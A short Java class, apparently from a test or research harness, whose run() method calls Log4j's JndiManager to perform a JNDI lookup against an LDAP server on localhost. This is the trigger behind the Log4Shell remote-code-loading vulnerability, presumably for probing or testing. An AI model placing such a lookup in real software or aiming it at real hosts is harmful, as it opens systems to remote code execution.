package seta.log4j.p5;

public final class ActionImpl implements Action {
    @Override
    public void run() throws Exception {
        org.apache.logging.log4j.core.net.JndiManager.getDefaultManager().lookup("ldap://127.0.0.1:1389/x");
    }
}
